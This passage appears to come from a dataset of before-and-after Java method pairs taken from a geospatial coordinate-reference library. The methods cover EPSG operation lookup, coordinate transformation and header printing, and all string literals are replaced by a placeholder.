    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",TableInfo.ENUM_REPLACEMENT);
    addReplacement(SQLTranslator.TABLE_PREFIX + ""String_Node_Str"",""String_Node_Str"");
  }
}"
91851,"/** 
 * Prints the name and authority code (if any) of the given object.
 */
private void printNameAndIdentifier(final IdentifiedObject object){
  outHeader.append(object.getName().getCode());
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  outHeader.nextLine();
}","/** 
 * Prints the name and authority code (if any) of the given object.
 * @param object      the object for which to print name and identifier.
 * @param idRequired  {@code true} for printing the name only if an identifier is present.
 * @return whether this method has printed something.
 */
private boolean printNameAndIdentifier(final IdentifiedObject object,final boolean idRequired){
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (idRequired && identifier == null) {
    return false;
  }
  outHeader.append(object.getName().getCode());
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  if (!idRequired) {
    outHeader.nextLine();
  }
  return true;
}"
91852,"/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  operation=CRS.findOperation(fetchCRS(Option.SOURCE_CRS),fetchCRS(Option.TARGET_CRS),null);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS());
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS());
  printHeader(Vocabulary.Keys.Methods);
  printOperationMethods(operation,false);
  outHeader.nextLine();
  if (options.containsKey(Option.VERBOSE)) {
    final WKTFormat f=new WKTFormat(locale,timezone);
    f.setConvention(options.containsKey(Option.DEBUG) ? Convention.INTERNAL : convention);
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    final CharSequence[] lines=CharSequences.splitOnEOL(f.format(operation.getMathTransform()));
    for (int i=0; i < lines.length; i++) {
      if (i == 0) {
        printHeader(Vocabulary.Keys.Details);
      }
 else {
        printCommentLinePrefix();
        outHeader.nextColumn();
      }
      outHeader.append(lines[i]);
      outHeader.nextLine();
    }
  }
  double accuracy=CRS.getLinearAccuracy(operation);
  if (accuracy >= 0) {
    if (accuracy == 0) {
      accuracy=Formulas.LINEAR_TOLERANCE;
    }
    printHeader(Vocabulary.Keys.Accuracy);
    if (colors) {
      outHeader.append(X364.FOREGROUND_YELLOW.sequence());
    }
    outHeader.append(Double.toString(accuracy));
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
    outHeader.append(""String_Node_Str"");
    outHeader.nextLine();
  }
  outHeader.flush();
  outHeader=null;
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    computeDomainOfValidity();
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    if (useStandardInput) {
      try (LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding))){
        transform(in,""String_Node_Str"");
      }
     }
 else {
      for (      final String file : files) {
        try (LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding))){
          transform(in,file);
        }
       }
    }
  }
  return 0;
}","/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  final CoordinateReferenceSystem sourceCRS=fetchCRS(Option.SOURCE_CRS);
  final CoordinateReferenceSystem targetCRS=fetchCRS(Option.TARGET_CRS);
  GeographicBoundingBox areaOfInterest=null;
  List<double[]> points=Collections.emptyList();
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    if (useStandardInput) {
      try (LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding))){
        points=readCoordinates(in,""String_Node_Str"");
      }
     }
 else {
      for (      final String file : files) {
        try (LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding))){
          points=readCoordinates(in,file);
        }
       }
    }
    try {
      final GeographicCRS domainOfValidityCRS=ReferencingUtilities.toNormalizedGeographicCRS(sourceCRS);
      if (domainOfValidityCRS != null) {
        toDomainOfValidity=CRS.findOperation(sourceCRS,domainOfValidityCRS,null).getMathTransform();
        areaOfInterest=computeAreaOfInterest(points);
      }
    }
 catch (    FactoryException e) {
      warning(e);
    }
  }
  operation=CRS.findOperation(sourceCRS,targetCRS,areaOfInterest);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS(),false);
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS(),false);
  printHeader(Vocabulary.Keys.Operations);
  printOperations(operation,false);
  outHeader.nextLine();
  printDomainOfValidity(operation.getDomainOfValidity());
  printAccuracy(CRS.getLinearAccuracy(operation));
  if (options.containsKey(Option.VERBOSE)) {
    printDetails();
  }
  outHeader.flush();
  outHeader=null;
  if (!points.isEmpty()) {
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    transform(points);
    if (errorMessage != null) {
      error(errorMessage,errorCause);
    }
  }
  return 0;
}"
91853,"/** 
 * Transforms the coordinates read from the given stream. This method ignores empty and comment lines.
 * @param in        the stream from where to read coordinates.
 * @param filename  the filename, for error reporting only.
 * @return the errors that occurred during transformation.
 */
private void transform(final LineNumberReader in,final String filename) throws IOException {
  final int dimension=operation.getSourceCRS().getCoordinateSystem().getDimension();
  final MathTransform mt=operation.getMathTransform();
  final double[] result=new double[mt.getTargetDimensions()];
  final double[] domainCoordinate;
  final DirectPositionView positionInDomain;
  if (toDomainOfValidityCRS != null) {
    domainCoordinate=new double[toDomainOfValidityCRS.getTargetDimensions()];
    positionInDomain=new DirectPositionView(domainCoordinate,0,domainCoordinate.length);
  }
 else {
    domainCoordinate=null;
    positionInDomain=null;
  }
  try {
    String line;
    while ((line=in.readLine()) != null) {
      final int start=CharSequences.skipLeadingWhitespaces(line,0,line.length());
      if (start < line.length() && line.charAt(start) != '#') {
        final double[] coordinates=CharSequences.parseDoubles(line,',');
        if (coordinates.length != dimension) {
          throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimensionForCRS_3,operation.getSourceCRS().getName().getCode(),dimension,coordinates.length));
        }
        mt.transform(coordinates,0,result,0,1);
        for (int i=0; i < result.length; i++) {
          if (i != 0) {
            out.print(',');
          }
          final double value=result[i];
          final String s;
          if (Math.abs(value) >= thresholdForScientificNotation[i]) {
            s=Double.toString(value);
          }
 else {
            coordinateFormat.setMinimumFractionDigits(numFractionDigits[i]);
            coordinateFormat.setMaximumFractionDigits(numFractionDigits[i]);
            s=coordinateFormat.format(value);
          }
          out.print(CharSequences.spaces(ordinateWidth - s.length()));
          out.print(s);
        }
        if (domainCoordinate != null) {
          boolean inside;
          try {
            toDomainOfValidityCRS.transform(coordinates,0,domainCoordinate,0,1);
            inside=domainOfValidity.contains(positionInDomain);
          }
 catch (          TransformException e) {
            inside=false;
            warning(e);
          }
          if (!inside) {
            out.print(""String_Node_Str"");
            printQuotedText(Errors.getResources(locale).getString(Errors.Keys.OutsideDomainOfValidity),0,X364.FOREGROUND_RED);
          }
        }
        out.println();
      }
    }
  }
 catch (  NumberFormatException|MismatchedDimensionException|TransformException e) {
    error(Errors.format(Errors.Keys.ErrorInFileAtLine_2,filename,in.getLineNumber()),e);
  }
}","/** 
 * Transforms the given coordinates.
 */
private void transform(final List<double[]> points) throws TransformException {
  final int dimension=operation.getSourceCRS().getCoordinateSystem().getDimension();
  final MathTransform mt=operation.getMathTransform();
  final double[] result=new double[mt.getTargetDimensions()];
  final double[] domainCoordinate;
  final DirectPositionView positionInDomain;
  final ImmutableEnvelope domainOfValidity;
  final GeographicBoundingBox bbox;
  if (toDomainOfValidity != null && (bbox=CRS.getGeographicBoundingBox(operation)) != null) {
    domainOfValidity=new ImmutableEnvelope(bbox);
    domainCoordinate=new double[toDomainOfValidity.getTargetDimensions()];
    positionInDomain=new DirectPositionView(domainCoordinate,0,domainCoordinate.length);
  }
 else {
    domainOfValidity=null;
    domainCoordinate=null;
    positionInDomain=null;
  }
  for (  final double[] coordinates : points) {
    if (coordinates.length != dimension) {
      throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimensionForCRS_3,operation.getSourceCRS().getName().getCode(),dimension,coordinates.length));
    }
    mt.transform(coordinates,0,result,0,1);
    for (int i=0; i < result.length; i++) {
      if (i != 0) {
        out.print(',');
      }
      final double value=result[i];
      final String s;
      if (Math.abs(value) >= thresholdForScientificNotation[i]) {
        s=Double.toString(value);
      }
 else {
        coordinateFormat.setMinimumFractionDigits(numFractionDigits[i]);
        coordinateFormat.setMaximumFractionDigits(numFractionDigits[i]);
        s=coordinateFormat.format(value);
      }
      out.print(CharSequences.spaces(ordinateWidth - s.length()));
      out.print(s);
    }
    if (domainOfValidity != null) {
      boolean inside;
      try {
        toDomainOfValidity.transform(coordinates,0,domainCoordinate,0,1);
        inside=domainOfValidity.contains(positionInDomain);
      }
 catch (      TransformException e) {
        inside=false;
        warning(e);
      }
      if (!inside) {
        out.print(""String_Node_Str"");
        printQuotedText(Errors.getResources(locale).getString(Errors.Keys.OutsideDomainOfValidity),0,X364.FOREGROUND_RED);
      }
    }
    out.println();
  }
}"
91854,"/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=JDK8.putIfAbsent(objects,code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (JDK8.remove(objects,code,null)) {
        codes=null;
      }
    }
  }
  return object;
}","/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(getLocale()).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=JDK8.putIfAbsent(objects,code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (JDK8.remove(objects,code,null)) {
        codes=null;
      }
    }
  }
  return object;
}"
91855,"/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      try (ResultSet result=executeQuery(key,sql,pair)){
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
     }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}","/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first. Deprecated operations are not included in the set; if a deprecated operation is really wanted, it can be fetched by an explicit call to   {@link #createCoordinateOperation(String)}.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      try (ResultSet result=executeQuery(key,sql,pair)){
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
     }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}"
91856,"/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException|MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      try {
        candidate=it.next();
      }
 catch (      BackingStoreException exception) {
        throw exception.unwrapOrRethrow(FactoryException.class);
      }
      if (inverse)       try {
        candidate=inverse(candidate);
      }
 catch (      NoninvertibleTransformException exception) {
        Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
        continue;
      }
    }
 catch (    MissingFactoryResourceException e) {
      log(e);
      continue;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}","/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException|MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      candidate=it.next();
    }
 catch (    BackingStoreException exception) {
      FactoryException cause=exception.unwrapOrRethrow(FactoryException.class);
      if (cause instanceof MissingFactoryResourceException) {
        log(cause);
        continue;
      }
      throw cause;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          if (inverse)           try {
            candidate=inverse(candidate);
          }
 catch (          NoninvertibleTransformException exception) {
            Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
            continue;
          }
catch (          MissingFactoryResourceException e) {
            log(e);
            continue;
          }
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}"
91857,"/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),coordinateOperationAccuracy == null);
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new CoordinateOperation[flattened.size()]));
}","/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),(coordinateOperationAccuracy == null),(domainOfValidity == null));
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new CoordinateOperation[flattened.size()]));
}"
91858,"/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation)) {
      if (coordinateOperationAccuracy == null) {
        setAccuracy=(PositionalAccuracyConstant.getLinearAccuracy(op) > 0);
        if (setAccuracy) {
          coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
        }
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
  }
}","/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @param setDomain   {@code true} for setting the {@link #domainOfValidity} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy,boolean setDomain) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
